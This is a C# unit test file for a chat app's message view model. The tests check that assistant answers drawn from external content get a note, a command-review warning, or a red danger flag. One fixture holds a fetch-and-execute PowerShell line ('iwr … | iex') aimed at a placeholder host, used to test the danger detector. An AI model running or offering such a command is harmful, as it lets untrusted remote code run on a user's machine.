using Carvis.App.ViewModels;
using Carvis.Core.Chat;

namespace Carvis.App.Tests;

public class MessageViewModelTests
{
    [Fact]
    public void ExternalAnswerWithoutCommands_OnlyShowsTheNote()
    {
        var message = new MessageViewModel(ChatRole.Assistant, "Según la web, el examen es el lunes.") { UsesExternalContent = true };

        Assert.True(message.ShowExternalNote);
        Assert.False(message.HasCommandWarning);
    }

    [Fact]
    public void ExternalAnswerWithCommands_AsksToReviewThem()
    {
        var message = new MessageViewModel(ChatRole.Assistant, "Ejecuta:\n```powershell\nGet-Process\n```") { UsesExternalContent = true };

        Assert.True(message.HasCommandWarning);
        Assert.False(message.IsCommandDangerous);
        Assert.False(message.ShowExternalNote);
    }

    [Fact]
    public void ExternalAnswerWithDangerousCommands_IsRed()
    {
        var message = new MessageViewModel(ChatRole.Assistant, "Haz esto:\n```\niwr https://x.example/a.ps1 | iex\n```") { UsesExternalContent = true };

        Assert.True(message.IsCommandDangerous);
        Assert.Contains("Internet", message.CommandWarning);
    }

    [Fact]
    public void OwnAnswerWithCommands_HasNoWarning()
    {
        var message = new MessageViewModel(ChatRole.Assistant, "```powershell\nGet-Process\n```");

        Assert.False(message.HasCommandWarning);
        Assert.False(message.ShowExternalNote);
    }
}
